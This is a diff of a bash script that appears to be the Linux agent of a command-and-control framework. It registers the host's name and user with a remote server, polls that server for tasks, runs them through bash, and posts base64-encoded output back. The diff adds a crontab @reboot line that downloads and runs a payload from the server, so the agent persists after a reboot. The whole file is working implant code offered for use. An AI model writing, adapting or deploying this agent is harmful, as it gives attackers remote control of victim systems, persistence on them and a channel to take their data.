@@ -1,27 +1,37 @@
 #!/bin/bash
+
+#Define parameters needed
 ip="REPLACE_IP"
 port="REPLACE_PORT"
 interface="REPLACE_INTERFACE"
 n=.3
 
+#Define agent Registeration link
 regl="http://$ip:$port/reg/"
 
 declare -A data=( [eth]=$interface [hname]=$(hostname) )
 
-name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami) $regl) 
+#Get defined agent name (6 random characters)
+name=$(curl -X POST -F eth=$interface -F hname=$(hostname) -F username=$(whoami) $regl)
 
+#Define task, results links
 taskl="http://$ip:$port/tasks/$name/"
 resultl="http://$ip:$port/Lin-results/$name/"
 
-userfile=$(whoami)
+# Add the cronjob to run the script after rebooting (presistency providing)
+echo "@reboot sleep 45 && wget http://$ip:$port/download/$interface -O /tmp/bash;chmod +x /tmp/bash;bash /tmp/bash" | crontab -
+
 while :
-do  
-    curl $taskl > /tmp/tasks-$userfile 
-    if [ -s /tmp/tasks-$userfile ]; then
-        cat /tmp/tasks-$userfile | bash > /tmp/results-$userfile
-        base64 /tmp/results-$userfile > /tmp/enc-result-$userfile  
-        curl -X POST --data "@/tmp/enc-result-$userfile" $resultl
+do
+    #Check for tasks
+    curl $taskl > /tmp/tasks
+    if [ -s /tmp/tasks ]; then
+        #Execute tasks added
+        cat /tmp/tasks | bash > /tmp/results
+        base64 /tmp/results > /tmp/enc-result
+        curl -X POST --data "@/tmp/enc-result" $resultl
     fi
-    sleep $n    
+    #Sleep for a while then continue the loop
+    sleep $n
 done
 
